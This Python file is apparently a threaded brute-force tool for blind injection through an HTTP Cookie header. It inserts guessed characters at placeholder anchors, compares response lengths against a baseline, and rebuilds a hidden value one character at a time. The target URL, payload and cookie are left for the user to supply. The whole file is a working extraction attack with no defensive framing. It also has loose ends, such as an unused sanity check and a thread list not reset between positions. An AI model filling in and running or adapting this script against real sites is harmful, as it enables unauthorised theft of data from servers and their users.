import string
import copy
from concurrent.futures import ThreadPoolExecutor, as_completed
import concurrent.futures.thread

import requests

def make_request_get(url, options, passed_params):
    if 'headers' in options:
        response = requests.get(url, headers=options['headers'])
    else:
        response = requests.get(url)
    return response, passed_params

WORDLIST = string.ascii_letters + string.digits
ANCHOR_INJ = '$$INJ$$'
ANCHOR_INDEX = '$$INDEX$$'

TARGET = ''
PAYLOAD = ''
HEADER = {'Cookie':""}
result = ''
length = 20
thread_num = 10
threads = []

default_length = len(requests.get(TARGET).text)

with ThreadPoolExecutor(max_workers=thread_num) as executor:
    for index in range(1, length+1):
        for char in WORDLIST:
            headers = copy.deepcopy(HEADER)
            headers['Cookie'] = HEADER['Cookie'].replace(ANCHOR_INJ, result + char)
            headers['Cookie'] = headers['Cookie'].replace(ANCHOR_INDEX, str(index))
            threads.append(executor.submit(make_request_get, TARGET, {'headers':headers}, char))
        for thread in as_completed(threads):
            request, char = thread.result()
            if len(request.text) != default_length:
                result += char
                print('progress: {}'.format(result))
                # kill other threads
                executor._threads.clear()
                concurrent.futures.thread._threads_queues.clear()
                threads = []
                break
            
def sanity_check(payload):
    return '$$INJ$$' in payload